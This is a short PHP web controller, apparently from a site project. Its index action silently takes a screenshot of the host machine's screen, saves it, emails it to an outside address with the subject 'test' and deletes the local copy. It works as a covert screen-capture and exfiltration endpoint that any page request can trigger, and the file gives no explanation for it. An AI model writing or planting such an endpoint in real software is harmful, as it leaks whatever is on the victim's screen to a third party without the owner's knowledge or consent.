<?php
class ShellController extends Controller
{
    public function indexAction()
    {
        $file = getUploadAddr().'adv/'.Date::getTimeStamp().'.png';
        $im = imagegrabscreen();
        imagepng($im, $file);
        imagedestroy($im);
        sendMail('maojianlw@139.com', '测试', Date::format(), $file);
        File::del($file);
    }

}